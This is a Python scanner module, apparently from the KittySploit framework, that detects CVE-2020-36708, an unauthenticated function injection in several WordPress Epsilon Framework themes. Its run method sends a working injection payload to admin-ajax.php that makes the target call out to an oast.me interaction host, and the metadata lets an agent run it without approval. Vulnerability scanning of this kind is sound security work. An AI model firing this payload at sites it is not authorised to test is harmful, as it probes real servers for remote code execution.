#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress themes including Shapely <= 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Epsilon Framework Themes <=2.4.8 - Remote Code Execution Detection',
        'description': 'WordPress themes including Shapely <= 1.2.7, NewsMag <= 2.4.1, Activello <= 1.4.0, Illdy <= 2.1.4, Allegiant <= 1.2.2, Newspaper X <= 1.3.1, Pixova Lite <= 2.0.5, Brilliance <= 1.2.7, MedZone Lite <= 1.2.4, Regina Lite <= 2.0.4, Transcend <= 1.1.8, Affluent <= 1.1.0, Bonkers <= 1.0.4, Antreas <= 1.0.2, Sparkling <= 2.4.8, and NatureMag Lite <= 1.0.4 contain a function injection caused by epsilon_framework_ajax_action, letting unauthenticated attackers call functions and achieve remote code execution, exploit requires no authentication.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'wordpress', 'rce', 'cve', 'cve2020', 'edb', 'wpscan', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/49327',
            'https://wpscan.com/vulnerability/10417',
            'https://wpscan.com/vulnerability/bec52a5b-c892-4763-a962-05da7100eca5',
            'https://www.wordfence.com/blog/2020/11/large-scale-attacks-target-epsilon-framework-themes/',
            'https://www.wordfence.com/threat-intel/vulnerabilities/id/5b75c322-539d-44e9-8f26-5ff929874b67?source=cve',
        ],
        'cve': 'CVE-2020-36708',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php?action=action_name'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data='action=epsilon_framework_ajax_action&args%5Baction%5D%5B%5D=Requests&args%5Baction%5D%5B%5D=request_multiple&args%5Bargs%5D%5B0%5D%5Burl%5D=https://oast.me/\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Interactsh Server', 'protocol_version',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='WordPress Epsilon Framework Themes <=2.4.8 - Remote Code Execution detected', path=path)
            return True
        return False

